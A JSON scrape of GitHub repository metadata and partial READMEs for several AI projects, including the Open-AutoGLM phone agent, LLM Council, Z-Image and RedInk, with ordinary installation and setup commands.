[
  {
    "basic_info": {
      "name": "Open-AutoGLM",
      "full_name": "zai-org/Open-AutoGLM",
      "owner": "zai-org",
      "description": "An Open Phone Agent Model & Framework. Unlocking the AI Phone for Everyone",
      "url": "https://github.com/zai-org/Open-AutoGLM",
      "clone_url": "https://github.com/zai-org/Open-AutoGLM.git",
      "ssh_url": "git@github.com:zai-org/Open-AutoGLM.git",
      "homepage": "https://autoglm.z.ai/blog",
      "created_at": "2025-12-08T09:23:44Z",
      "updated_at": "2025-12-14T02:53:40Z",
      "pushed_at": "2025-12-13T04:23:00Z"
    },
    "stats": {
      "stars": 13721,
      "forks": 2145,
      "watchers": 13721,
      "open_issues": 100,
      "size": 2450
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 106576
      },
      "license": "Apache License 2.0",
      "topics": [
        "agent",
        "phone-use-agent"
      ]
    },
    "content": {
      "readme": "# Open-AutoGLM\n\n[Readme in English](README_en.md)\n\n<div align=\"center\">\n<img src=resources/logo.svg width=\"20%\"/>\n</div>\n<p align=\"center\">\n    ğŸ‘‹ åŠ å…¥æˆ‘ä»¬çš„ <a href=\"resources/WECHAT.md\" target=\"_blank\">å¾®ä¿¡</a> ç¤¾åŒº\n</p>\n<p align=\"center\">\n    ğŸ¤ è¿›ä¸€æ­¥åœ¨æˆ‘ä»¬çš„äº§å“ <a href=\"https://autoglm.zhipuai.cn/autotyper/\" target=\"_blank\">æ™ºè°± AI è¾“å…¥æ³•</a> ä½“éªŒâ€œç”¨å˜´å‘æŒ‡ä»¤â€\n</p>\n\n## æ‡’äººç‰ˆå¿«é€Ÿå®‰è£…\n\nä½ å¯ä»¥ä½¿ç”¨Claude Codeï¼Œé…ç½® [GLM Coding Plan](https://bigmodel.cn/glm-coding) åï¼Œè¾“å…¥ä»¥ä¸‹æç¤ºè¯ï¼Œå¿«é€Ÿéƒ¨ç½²æœ¬é¡¹ç›®ã€‚\n\n```\nè®¿é—®æ–‡æ¡£ï¼Œä¸ºæˆ‘å®‰è£… AutoGLM\nhttps://raw.githubusercontent.com/zai-org/Open-AutoGLM/refs/heads/main/README.md\n```\n\n## é¡¹ç›®ä»‹ç»\n\nPhone Agent æ˜¯ä¸€ä¸ªåŸºäº AutoGLM æ„å»ºçš„æ‰‹æœºç«¯æ™ºèƒ½åŠ©ç†æ¡†æ¶ï¼Œå®ƒèƒ½å¤Ÿä»¥å¤šæ¨¡æ€æ–¹å¼ç†è§£æ‰‹æœºå±å¹•å†…å®¹ï¼Œå¹¶é€šè¿‡è‡ªåŠ¨åŒ–æ“ä½œå¸®åŠ©ç”¨æˆ·å®Œæˆä»»åŠ¡ã€‚ç³»ç»Ÿé€šè¿‡\nADB(Android Debug Bridge)æ¥æ§åˆ¶è®¾å¤‡ï¼Œä»¥è§†è§‰è¯­è¨€æ¨¡å‹è¿›è¡Œå±å¹•æ„ŸçŸ¥ï¼Œå†ç»“åˆæ™ºèƒ½è§„åˆ’èƒ½åŠ›ç”Ÿæˆå¹¶æ‰§è¡Œæ“ä½œæµç¨‹ã€‚ç”¨æˆ·åªéœ€ç”¨è‡ªç„¶è¯­è¨€æè¿°éœ€æ±‚ï¼Œå¦‚â€œæ‰“å¼€å°çº¢ä¹¦æœç´¢ç¾é£Ÿâ€ï¼ŒPhone\nAgent å³å¯è‡ªåŠ¨è§£ææ„å›¾ã€ç†è§£å½“å‰ç•Œé¢ã€è§„åˆ’ä¸‹ä¸€æ­¥åŠ¨ä½œå¹¶å®Œæˆæ•´ä¸ªæµç¨‹ã€‚ç³»ç»Ÿè¿˜å†…ç½®æ•æ„Ÿæ“ä½œç¡®è®¤æœºåˆ¶ï¼Œå¹¶æ”¯æŒåœ¨ç™»å½•æˆ–éªŒè¯ç åœºæ™¯ä¸‹è¿›è¡Œäººå·¥æ¥ç®¡ã€‚åŒæ—¶ï¼Œå®ƒæä¾›è¿œç¨‹\nADB è°ƒè¯•èƒ½åŠ›ï¼Œå¯é€šè¿‡ WiFi æˆ–ç½‘ç»œè¿æ¥è®¾å¤‡ï¼Œå®ç°çµæ´»çš„è¿œç¨‹æ§åˆ¶ä¸å¼€å‘ã€‚\n\n> âš ï¸\n> æœ¬é¡¹ç›®ä»…ä¾›ç ”ç©¶å’Œå­¦ä¹ ä½¿ç”¨ã€‚ä¸¥ç¦ç”¨äºéæ³•è·å–ä¿¡æ¯ã€å¹²æ‰°ç³»ç»Ÿæˆ–ä»»ä½•è¿æ³•æ´»åŠ¨ã€‚è¯·ä»”ç»†å®¡é˜… [ä½¿ç”¨æ¡æ¬¾](resources/privacy_policy.txt)ã€‚\n\n## æ¨¡å‹ä¸‹è½½åœ°å€\n\n| Model                         | Download Links                                                                                                                                                         |\n|-------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| AutoGLM-Phone-9B              | [ğŸ¤— Hugging Face](https://huggingface.co/zai-org/AutoGLM-Phone-9B)<br>[ğŸ¤– ModelScope](https://modelscope.cn/models/ZhipuAI/AutoGLM-Phone-9B)                           |\n| AutoGLM-Phone-9B-Multilingual | [ğŸ¤— Hugging Face](https://huggingface.co/zai-org/AutoGLM-Phone-9B-Multilingual)<br>[ğŸ¤– ModelScope](https://modelscope.cn/models/ZhipuAI/AutoGLM-Phone-9B-Multilingual) |\n\nå…¶ä¸­ï¼Œ`AutoGLM-Phone-9B` æ˜¯é’ˆå¯¹ä¸­æ–‡æ‰‹æœºåº”ç”¨ä¼˜åŒ–çš„æ¨¡å‹ï¼Œè€Œ `AutoGLM-Phone-9B-Multilingual` æ”¯æŒè‹±è¯­åœºæ™¯ï¼Œé€‚ç”¨äºåŒ…å«è‹±æ–‡ç­‰å…¶ä»–è¯­è¨€å†…å®¹çš„åº”ç”¨ã€‚\n\n## ç¯å¢ƒå‡†å¤‡\n\n### 1. Python ç¯å¢ƒ\n\nå»ºè®®ä½¿ç”¨ Python 3.10 åŠä»¥ä¸Šç‰ˆæœ¬ã€‚\n\n### 2. ADB (Android Debug Bridge)\n\n1. ä¸‹è½½å®˜æ–¹ ADB [å®‰è£…åŒ…](https://developer.android.com/tools/releases/platform-tools?hl=zh-cn)ï¼Œå¹¶è§£å‹åˆ°è‡ªå®šä¹‰è·¯å¾„\n2. é…ç½®ç¯å¢ƒå˜é‡\n\n- MacOS é…ç½®æ–¹æ³•ï¼šåœ¨ `Terminal` æˆ–è€…ä»»ä½•å‘½ä»¤è¡Œå·¥å…·é‡Œ\n\n  ```bash\n  # å‡è®¾è§£å‹åçš„ç›®å½•ä¸º ~/Downloads/platform-toolsã€‚å¦‚æœä¸æ˜¯è¯·è‡ªè¡Œè°ƒæ•´å‘½ä»¤ã€‚\n  export PATH=${PATH}:~/Downloads/platform-tools\n  ```\n\n- Windows é…ç½®æ–¹æ³•ï¼šå¯å‚è€ƒ [ç¬¬ä¸‰æ–¹æ•™ç¨‹](https://blog.csdn.net/x2584179909/article/details/108319973) è¿›è¡Œé…ç½®ã€‚\n\n### 3. Android 7.0+ çš„è®¾å¤‡æˆ–æ¨¡æ‹Ÿå™¨ï¼Œå¹¶å¯ç”¨ `å¼€å‘è€…æ¨¡å¼` å’Œ `USB è°ƒè¯•`\n\n1. å¼€å‘è€…æ¨¡å¼å¯ç”¨ï¼šé€šå¸¸å¯ç”¨æ–¹æ³•æ˜¯ï¼Œæ‰¾åˆ° `è®¾ç½®-å…³äºæ‰‹æœº-ç‰ˆæœ¬å·` ç„¶åè¿ç»­å¿«é€Ÿç‚¹å‡» 10\n   æ¬¡å·¦å³ï¼Œç›´åˆ°å¼¹å‡ºå¼¹çª—æ˜¾ç¤ºâ€œå¼€å‘è€…æ¨¡å¼å·²å¯ç”¨â€ã€‚ä¸åŒæ‰‹æœºä¼šæœ‰äº›è®¸å·®åˆ«ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œå¯ä»¥ä¸Šç½‘æœç´¢ä¸€ä¸‹æ•™ç¨‹ã€‚\n2. USB è°ƒè¯•å¯ç”¨ï¼šå¯ç”¨å¼€å‘è€…æ¨¡å¼ä¹‹åï¼Œä¼šå‡ºç° `è®¾ç½®-å¼€å‘è€…é€‰é¡¹-USB è°ƒè¯•`ï¼Œå‹¾é€‰å¯ç”¨\n3. éƒ¨åˆ†æœºå‹åœ¨è®¾ç½®å¼€å‘è€…é€‰é¡¹ä»¥å, å¯èƒ½éœ€è¦é‡å¯è®¾å¤‡æ‰èƒ½ç”Ÿæ•ˆ. å¯ä»¥æµ‹è¯•ä¸€ä¸‹: å°†æ‰‹æœºç”¨USBæ•°æ®çº¿è¿æ¥åˆ°ç”µè„‘å, `adb devices`\n   æŸ¥çœ‹æ˜¯å¦æœ‰è®¾å¤‡ä¿¡æ¯, å¦‚æœæ²¡æœ‰è¯´æ˜è¿æ¥å¤±è´¥.\n\n**è¯·åŠ¡å¿…ä»”ç»†æ£€æŸ¥ç›¸å…³æƒé™**\n\n![æƒé™](resources/screenshot-20251209-181423.png)\n\n### 4. å®‰è£… ADB Keyboard(ç”¨äºæ–‡æœ¬è¾“å…¥)\n\nä¸‹è½½ [å®‰è£…åŒ…](https://github.com/senzhk/ADBKeyBoard/blob/master/ADBKeyboard.apk) å¹¶åœ¨å¯¹åº”çš„å®‰å“è®¾å¤‡ä¸­è¿›è¡Œå®‰è£…ã€‚\næ³¨æ„ï¼Œå®‰è£…å®Œæˆåè¿˜éœ€è¦åˆ° `è®¾ç½®-è¾“å…¥æ³•` æˆ–è€… `è®¾ç½®-é”®ç›˜åˆ—è¡¨` ä¸­å¯ç”¨ `ADB Keyboard` æ‰èƒ½ç”Ÿæ•ˆ(æˆ–ä½¿ç”¨å‘½ä»¤`adb shell ime enable com.android.adbkeyboard/.AdbIME`[How-to-use](https://github.com/senzhk/ADBKeyBoard/blob/master/README.md#how-to-use))\n\n## éƒ¨ç½²å‡†å¤‡å·¥ä½œ\n\n### 1. å®‰è£…ä¾èµ–\n\n```bash\npip install -r requirements.txt \npip install -e .\n```\n\n### 2. é…ç½® ADB\n\nç¡®è®¤ **USBæ•°æ®çº¿å…·æœ‰æ•°æ®ä¼ è¾“åŠŸèƒ½**, è€Œä¸æ˜¯ä»…æœ‰å……ç”µåŠŸèƒ½\n\nç¡®ä¿å·²å®‰è£… ADB å¹¶ä½¿ç”¨ **USBæ•°æ®çº¿** è¿æ¥è®¾å¤‡ï¼š\n\n```bash\n# æ£€æŸ¥å·²è¿æ¥çš„è®¾å¤‡\nadb devices\n\n# è¾“å‡ºç»“æœåº”æ˜¾ç¤ºä½ çš„è®¾å¤‡ï¼Œå¦‚ï¼š\n# List of devices attached\n# emulator-5554   device\n```\n\n### 3. å¯åŠ¨æ¨¡å‹æœåŠ¡\n\nä½ å¯ä»¥é€‰æ‹©è‡ªè¡Œéƒ¨ç½²æ¨¡å‹æœåŠ¡ï¼Œæˆ–ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡å‹æœåŠ¡å•†ã€‚\n\n#### é€‰é¡¹ A: ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡å‹æœåŠ¡\n\nå¦‚æœä½ ä¸æƒ³è‡ªè¡Œéƒ¨ç½²æ¨¡å‹ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å·²éƒ¨ç½²æˆ‘ä»¬æ¨¡å‹çš„ç¬¬ä¸‰æ–¹æœåŠ¡ï¼š\n\n**1. æ™ºè°± BigModel**\n\n- æ–‡æ¡£: https://docs.bigmodel.cn/cn/api/introduction\n- `--base-url`: `https://open.bigmodel.cn/api/paas/v4`\n- `--model`: `autoglm-phone`\n- `--apikey`: åœ¨æ™ºè°±å¹³å°ç”³è¯·ä½ çš„ API Key\n\n**2. ModelScope(é­”æ­ç¤¾åŒº)**\n\n- æ–‡æ¡£: https://modelscope.cn/models/ZhipuAI/AutoGLM-Phone-9B\n- `--base-url`: `https://api-inference.modelscope.cn/v1`\n- `--model`: `ZhipuAI/AutoGLM-Phone-9B`\n- `--apikey`: åœ¨ ModelScope å¹³å°ç”³è¯·ä½ çš„ API Key\n\nä½¿ç”¨ç¬¬ä¸‰æ–¹æœåŠ¡çš„ç¤ºä¾‹ï¼š\n\n```bash\n# ä½¿ç”¨æ™ºè°± BigModel\npython main.py --base-url https://open.bigmodel.cn/api/paas/v4 --model \"autoglm-phone\" --apikey \"your-bigmodel-api-key\" \"æ‰“å¼€ç¾å›¢æœç´¢é™„è¿‘çš„ç«é”…åº—\"\n\n# ä½¿ç”¨ ModelScope\npython main.py --base-url https://api-inference.modelscope.cn/v1 --model \"ZhipuAI/AutoGLM-Phone-9B\" --apikey \"your-modelscope-api-key\" \"æ‰“å¼€ç¾å›¢æœç´¢é™„è¿‘çš„ç«é”…åº—\"\n```\n\n#### é€‰é¡¹ B: è‡ªè¡Œéƒ¨ç½²æ¨¡å‹\n\nå¦‚æœä½ å¸Œæœ›åœ¨æœ¬åœ°æˆ–è‡ªå·±çš„æœåŠ¡å™¨ä¸Šéƒ¨ç½²æ¨¡å‹ï¼š\n\n1. æŒ‰ç…§ `requirements.txt` ä¸­ `For Model Deployment` ç« èŠ‚è‡ªè¡Œå®‰è£…æ¨ç†å¼•æ“æ¡†æ¶ã€‚\n\nå¯¹äºSGLangï¼Œ é™¤äº†ä½¿ç”¨pipå®‰è£…ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å®˜æ–¹docker:\n>\n> ```shell\n> docker pull lmsysorg/sglang:v0.5.6.post1\n> ```\n>\n> è¿›å…¥å®¹å™¨ï¼Œæ‰§è¡Œ\n>\n> ```\n> pip install nvidia-cudnn-cu12==9.16.0.29\n> ```\n\nå¯¹äº vLLMï¼Œé™¤äº†ä½¿ç”¨pip å®‰è£…ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å®˜æ–¹docker:\n>\n> ```shell\n> docker pull vllm/vllm-openai:v0.12.0\n> ```\n>\n> è¿›å…¥å®¹å™¨ï¼Œæ‰§è¡Œ\n>\n> ```\n> pip install -U transformers --pre\n> ```\n\n**æ³¨æ„**: ä¸Šè¿°æ­¥éª¤å‡ºç°çš„å…³äº transformers çš„ä¾èµ–å†²çªå¯ä»¥å¿½ç•¥ã€‚\n\n1. åœ¨å¯¹åº”å®¹å™¨æˆ–è€…å®ä½“æœºä¸­(éå®¹å™¨å®‰è£…)ä¸‹è½½æ¨¡å‹ï¼Œé€šè¿‡ SGlang / vLLM å¯åŠ¨ï¼Œå¾—åˆ° OpenAI æ ¼å¼æœåŠ¡ã€‚è¿™é‡Œæä¾›ä¸€ä¸ª vLLMéƒ¨ç½²æ–¹æ¡ˆï¼Œè¯·ä¸¥æ ¼éµå¾ªæˆ‘ä»¬æä¾›çš„å¯åŠ¨å‚æ•°:\n\n- vLLM:\n\n```shell\npython3 -m vllm.entrypoints.openai.api_server \\\n --served-model-name autoglm-phone-9b \\\n --allowed-local-media-path /   \\\n --mm-encoder-tp-mode data \\\n --mm_processor_cache_type shm \\\n --mm_processor_kwargs \"{\\\"max_pixels\\\":5000000}\" \\\n --max-model-len 25480  \\\n --chat-te",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:19.975032"
  },
  {
    "basic_info": {
      "name": "llm-council",
      "full_name": "karpathy/llm-council",
      "owner": "karpathy",
      "description": "LLM Council works together to answer your hardest questions",
      "url": "https://github.com/karpathy/llm-council",
      "clone_url": "https://github.com/karpathy/llm-council.git",
      "ssh_url": "git@github.com:karpathy/llm-council.git",
      "homepage": "",
      "created_at": "2025-11-22T23:24:14Z",
      "updated_at": "2025-12-14T02:45:44Z",
      "pushed_at": "2025-11-22T23:35:21Z"
    },
    "stats": {
      "stars": 11118,
      "forks": 1991,
      "watchers": 11118,
      "open_issues": 73,
      "size": 262
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 24729,
        "JavaScript": 20694,
        "CSS": 9346,
        "Shell": 625,
        "HTML": 357
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# LLM Council\n\n![llmcouncil](header.jpg)\n\nThe idea of this repo is that instead of asking a question to your favorite LLM provider (e.g. OpenAI GPT 5.1, Google Gemini 3.0 Pro, Anthropic Claude Sonnet 4.5, xAI Grok 4, eg.c), you can group them into your \"LLM Council\". This repo is a simple, local web app that essentially looks like ChatGPT except it uses OpenRouter to send your query to multiple LLMs, it then asks them to review and rank each other's work, and finally a Chairman LLM produces the final response.\n\nIn a bit more detail, here is what happens when you submit a query:\n\n1. **Stage 1: First opinions**. The user query is given to all LLMs individually, and the responses are collected. The individual responses are shown in a \"tab view\", so that the user can inspect them all one by one.\n2. **Stage 2: Review**. Each individual LLM is given the responses of the other LLMs. Under the hood, the LLM identities are anonymized so that the LLM can't play favorites when judging their outputs. The LLM is asked to rank them in accuracy and insight.\n3. **Stage 3: Final response**. The designated Chairman of the LLM Council takes all of the model's responses and compiles them into a single final answer that is presented to the user.\n\n## Vibe Code Alert\n\nThis project was 99% vibe coded as a fun Saturday hack because I wanted to explore and evaluate a number of LLMs side by side in the process of [reading books together with LLMs](https://x.com/karpathy/status/1990577951671509438). It's nice and useful to see multiple responses side by side, and also the cross-opinions of all LLMs on each other's outputs. I'm not going to support it in any way, it's provided here as is for other people's inspiration and I don't intend to improve it. Code is ephemeral now and libraries are over, ask your LLM to change it in whatever way you like.\n\n## Setup\n\n### 1. Install Dependencies\n\nThe project uses [uv](https://docs.astral.sh/uv/) for project management.\n\n**Backend:**\n```bash\nuv sync\n```\n\n**Frontend:**\n```bash\ncd frontend\nnpm install\ncd ..\n```\n\n### 2. Configure API Key\n\nCreate a `.env` file in the project root:\n\n```bash\nOPENROUTER_API_KEY=sk-or-v1-...\n```\n\nGet your API key at [openrouter.ai](https://openrouter.ai/). Make sure to purchase the credits you need, or sign up for automatic top up.\n\n### 3. Configure Models (Optional)\n\nEdit `backend/config.py` to customize the council:\n\n```python\nCOUNCIL_MODELS = [\n    \"openai/gpt-5.1\",\n    \"google/gemini-3-pro-preview\",\n    \"anthropic/claude-sonnet-4.5\",\n    \"x-ai/grok-4\",\n]\n\nCHAIRMAN_MODEL = \"google/gemini-3-pro-preview\"\n```\n\n## Running the Application\n\n**Option 1: Use the start script**\n```bash\n./start.sh\n```\n\n**Option 2: Run manually**\n\nTerminal 1 (Backend):\n```bash\nuv run python -m backend.main\n```\n\nTerminal 2 (Frontend):\n```bash\ncd frontend\nnpm run dev\n```\n\nThen open http://localhost:5173 in your browser.\n\n## Tech Stack\n\n- **Backend:** FastAPI (Python 3.10+), async httpx, OpenRouter API\n- **Frontend:** React + Vite, react-markdown for rendering\n- **Storage:** JSON files in `data/conversations/`\n- **Package Management:** uv for Python, npm for JavaScript\n",
      "default_branch": "master"
    },
    "fetched_at": "2025-12-14T02:54:21.110057"
  },
  {
    "basic_info": {
      "name": "Z-Image",
      "full_name": "Tongyi-MAI/Z-Image",
      "owner": "Tongyi-MAI",
      "description": null,
      "url": "https://github.com/Tongyi-MAI/Z-Image",
      "clone_url": "https://github.com/Tongyi-MAI/Z-Image.git",
      "ssh_url": "git@github.com:Tongyi-MAI/Z-Image.git",
      "homepage": null,
      "created_at": "2025-11-26T09:18:10Z",
      "updated_at": "2025-12-14T02:49:25Z",
      "pushed_at": "2025-12-09T10:33:26Z"
    },
    "stats": {
      "stars": 6796,
      "forks": 380,
      "watchers": 6796,
      "open_issues": 54,
      "size": 57198
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 98875
      },
      "license": "Apache License 2.0",
      "topics": []
    },
    "content": {
      "readme": "<h1 align=\"center\">âš¡ï¸- Image<br><sub><sup>An Efficient Image Generation Foundation Model with Single-Stream Diffusion Transformer</sup></sub></h1>\n\n<div align=\"center\">\n\n[![Official Site](https://img.shields.io/badge/Official%20Site-333399.svg?logo=homepage)](https://tongyi-mai.github.io/Z-Image-blog/)&#160;\n[![Hugging Face](https://img.shields.io/badge/%F0%9F%A4%97%20Checkpoint-Z--Image--Turbo-yellow)](https://huggingface.co/Tongyi-MAI/Z-Image-Turbo)&#160;\n[![Hugging Face](https://img.shields.io/badge/%F0%9F%A4%97%20Online_Demo-Z--Image--Turbo-blue)](https://huggingface.co/spaces/Tongyi-MAI/Z-Image-Turbo)&#160;\n[![ModelScope Model](https://img.shields.io/badge/ğŸ¤–%20Checkpoint-Z--Image--Turbo-624aff)](https://www.modelscope.cn/models/Tongyi-MAI/Z-Image-Turbo)&#160;\n[![ModelScope Space](https://img.shields.io/badge/ğŸ¤–%20Online_Demo-Z--Image--Turbo-17c7a7)](https://www.modelscope.cn/aigc/imageGeneration?tab=advanced&versionId=469191&modelType=Checkpoint&sdVersion=Z_IMAGE_TURBO&modelUrl=modelscope%253A%252F%252FTongyi-MAI%252FZ-Image-Turbo%253Frevision%253Dmaster%7D%7BOnline)&#160;\n[![Art Gallery PDF](https://img.shields.io/badge/%F0%9F%96%BC%20Art_Gallery-PDF-ff69b4)](assets/Z-Image-Gallery.pdf)&#160;\n[![Web Art Gallery](https://img.shields.io/badge/%F0%9F%8C%90%20Web_Art_Gallery-online-00bfff)](https://modelscope.cn/studios/Tongyi-MAI/Z-Image-Gallery/summary)&#160;\n<a href=\"https://arxiv.org/abs/2511.22699\" target=\"_blank\"><img src=\"https://img.shields.io/badge/Report-b5212f.svg?logo=arxiv\" height=\"21px\"></a>\n\n\nWelcome to the official repository for the Z-Imageï¼ˆé€ ç›¸ï¼‰project!\n\n</div>\n\n\n\n## âœ¨ Z-Image\n\nZ-Image is a powerful and highly efficient image generation model with **6B** parameters. Currently there are three variants:\n\n- ğŸš€ **Z-Image-Turbo** â€“ A distilled version of Z-Image that matches or exceeds leading competitors with only **8 NFEs** (Number of Function Evaluations). It offers **âš¡ï¸sub-second inference latencyâš¡ï¸** on enterprise-grade H800 GPUs and fits comfortably within **16G VRAM consumer devices**. It excels in photorealistic image generation, bilingual text rendering (English & Chinese), and robust instruction adherence.\n\n- ğŸ§± **Z-Image-Base** â€“ The non-distilled foundation model. By releasing this checkpoint, we aim to unlock the full potential for community-driven fine-tuning and custom development.\n\n- âœï¸ **Z-Image-Edit** â€“ A variant fine-tuned on Z-Image specifically for image editing tasks. It supports creative image-to-image generation with impressive instruction-following capabilities, allowing for precise edits based on natural language prompts.\n\n### ğŸ“£ News\n\n*   **[2025-12-08]** ğŸ† Z-Image-Turbo ranked 8th overall on the **Artificial Analysis Text-to-Image Leaderboard**, making it the ğŸ¥‡ <strong style=\"color: #FFC300;\">#1 open-source model</strong>! [Check out the full leaderboard](https://artificialanalysis.ai/image/leaderboard/text-to-image).\n*   **[2025-12-01]** ğŸ‰ Our technical report for Z-Image is now available on [arXiv](https://arxiv.org/abs/2511.22699).\n*   **[2025-11-26]** ğŸ”¥ **Z-Image-Turbo is released!** We have released the model checkpoint on [Hugging Face](https://huggingface.co/Tongyi-MAI/Z-Image-Turbo) and [ModelScope](https://www.modelscope.cn/models/Tongyi-MAI/Z-Image-Turbo). Try our [online demo](https://huggingface.co/spaces/Tongyi-MAI/Z-Image-Turbo)!\n\n### ğŸ“¥ Model Zoo\n\n| Model | Hugging Face                                                                                                                                                                                                                                                                                                              | ModelScope                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |\n| :--- |:--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **Z-Image-Turbo** | [![Hugging Face](https://img.shields.io/badg",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:22.212076"
  },
  {
    "basic_info": {
      "name": "RedInk",
      "full_name": "HisMax/RedInk",
      "owner": "HisMax",
      "description": "çº¢å¢¨ - åŸºäºğŸŒNano Banana ProğŸŒ çš„ä¸€ç«™å¼å°çº¢ä¹¦å›¾æ–‡ç”Ÿæˆå™¨ ã€Šä¸€å¥è¯ä¸€å¼ å›¾ç‰‡ç”Ÿæˆå°çº¢ä¹¦å›¾æ–‡ã€‹ Red Ink - A one-stop Xiaohongshu image-and-text generator based on the ğŸŒNano Banana ProğŸŒ, \"One Sentence, One Image: Generate Xiaohongshu Text and Images.\"",
      "url": "https://github.com/HisMax/RedInk",
      "clone_url": "https://github.com/HisMax/RedInk.git",
      "ssh_url": "git@github.com:HisMax/RedInk.git",
      "homepage": "",
      "created_at": "2025-11-25T10:12:54Z",
      "updated_at": "2025-12-14T02:51:33Z",
      "pushed_at": "2025-11-29T19:43:23Z"
    },
    "stats": {
      "stars": 3601,
      "forks": 699,
      "watchers": 3601,
      "open_issues": 2,
      "size": 19227
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 189067,
        "Vue": 117985,
        "TypeScript": 33936,
        "CSS": 23861,
        "Dockerfile": 1568,
        "HTML": 349
      },
      "license": "Other",
      "topics": []
    },
    "content": {
      "readme": "![](images/logo.png)\n\n---\n\n[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-sa/4.0/)\n[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)\n[![Vue 3](https://img.shields.io/badge/vue-3.x-green.svg)](https://vuejs.org/)\n\n# çº¢å¢¨ - å°çº¢ä¹¦AIå›¾æ–‡ç”Ÿæˆå™¨\n\n> è®©ä¼ æ’­ä¸å†éœ€è¦é—¨æ§›ï¼Œè®©åˆ›ä½œä»æœªå¦‚æ­¤ç®€å•\n\n![](images/index.gif)\n\n<p align=\"center\">\n  <em>çº¢å¢¨é¦–é¡µ</em>\n</p>\n\n<p align=\"center\">\n  <img src=\"images/showcase-grid.png\" alt=\"ä½¿ç”¨çº¢å¢¨ç”Ÿæˆçš„å„ç±»å°çº¢ä¹¦å°é¢\" width=\"600\"/>\n</p>\n\n<p align=\"center\">\n  <em>ä½¿ç”¨çº¢å¢¨ç”Ÿæˆçš„å„ç±»å°çº¢ä¹¦å°é¢ - AIé©±åŠ¨ï¼Œé£æ ¼ç»Ÿä¸€ï¼Œæ–‡å­—å‡†ç¡®</em>\n</p>\n\n\n\n## å†™åœ¨å‰é¢\n\nå‰æ®µæ—¶é—´é»˜å­åœ¨ Linux.do å‘äº†ä¸€ä¸ªç”¨ Nano banana Pro åš PPT çš„å¸–å­,æ”¶è·äº† 600 å¤šä¸ªèµã€‚å¾ˆå¤šäººç”¨ğŸŒNano banana Pro å»åšäº§å“å®£ä¼ å›¾ã€ç›´æ¥ç”Ÿæˆæ¼«ç”»ç­‰ç­‰ã€‚æˆ‘å°±åœ¨æƒ³:**ä¸ºä»€ä¹ˆä¸æ‹¿ğŸŒ2æ¥åšç‚¹æ›´åŠŸåˆ©ã€æ›´åˆºæ¿€çš„äº‹æƒ…?**\n\näºæ˜¯å°±æœ‰äº†è¿™ä¸ªé¡¹ç›®ã€‚ä¸€å¥è¯ä¸€å¼ å›¾ç‰‡ç”Ÿæˆå°çº¢ä¹¦å›¾æ–‡\n\n---\n\n## âœ¨ æ•ˆæœå±•ç¤º\n\n### è¾“å…¥ä¸€å¥è¯,å°±èƒ½ç”Ÿæˆå®Œæ•´çš„å°çº¢ä¹¦å›¾æ–‡\n\n#### æç¤ºè¯ï¼šç§‹å­£æ˜¾ç™½ç¾ç”²ï¼ˆæš—å¹¿ä¸€ä¸ªï¼šé»˜å­ç‰Œç¾ç”²ï¼‰ï¼Œå›¾ç‰‡ æ˜¯æˆ‘çš„å°çº¢ä¹¦ä¸»é¡µã€‚ç¬¦åˆæˆ‘çš„é£æ ¼ç”Ÿæˆ\n\n#### åŒæ—¶æˆ‘è¿˜æˆªå›¾äº†æˆ‘çš„å°çº¢ä¹¦ä¸»é¡µï¼ŒåŒ…æ‹¬æˆ‘çš„å¤´åƒï¼Œç­¾åï¼ŒèƒŒæ™¯ï¼Œå§“åä»€ä¹ˆçš„\n\n![ç¤ºä¾‹1](./images/example-1.png)\n\n#### ç„¶åç­‰å¾…10-20ç§’åï¼Œå°±ä¼šæœ‰æ¯ä¸€é¡µçš„å¤§çº²ï¼Œå¤§å®¶å¯ä»¥æ ¹æ®çš„è‡ªå·±çš„éœ€æ±‚å»è°ƒæ•´é¡µé¢é¡ºåºï¼ˆä¸å»ºè®®ï¼‰ï¼Œè‡ªå®šä¹‰æ¯ä¸€ä¸ªé¡µé¢çš„å†…å®¹ï¼ˆè¿™ä¸ªå¾ˆå»ºè®®ï¼‰\n\n![ç¤ºä¾‹2](./images/example-2.png)\n\n#### é¦–å…ˆç”Ÿæˆçš„æ˜¯å°é¢é¡µ\n\n![ç¤ºä¾‹3](./images/example-3.png)\n\n#### ç„¶åç¨ç­‰ä¸€ä¼šå„¿åï¼Œä¼šç”Ÿæˆåé¢çš„æ‰€æœ‰é¡µé¢ï¼ˆè¿™é‡Œæ˜¯å¹¶å‘ç”Ÿæˆçš„æ‰€æœ‰é¡µé¢ï¼ˆé»˜è®¤æ˜¯15ä¸ªï¼‰ï¼Œå¦‚æœå¤§å®¶çš„APIä¾›åº”å•†æ— æ³•æ”¯æŒé«˜å¹¶å‘çš„è¯ï¼Œè®°å¾—è¦å»æ”¹ä¸€ä¸‹è®¾ç½®ï¼‰\n\n![ç¤ºä¾‹4](./images/example-4.png)\n\n---\n\n## ğŸ—ï¸ æŠ€æœ¯æ¶æ„\n\n### åç«¯\n- **è¯­è¨€**: Python 3.11+\n- **æ¡†æ¶**: Flask\n- **AI æ¨¡å‹**:\n  - Gemini 3 (æ–‡æ¡ˆç”Ÿæˆ)\n  - ğŸŒNano banana Pro (å›¾ç‰‡ç”Ÿæˆ)\n- **åŒ…ç®¡ç†**: uv\n\n### å‰ç«¯\n- 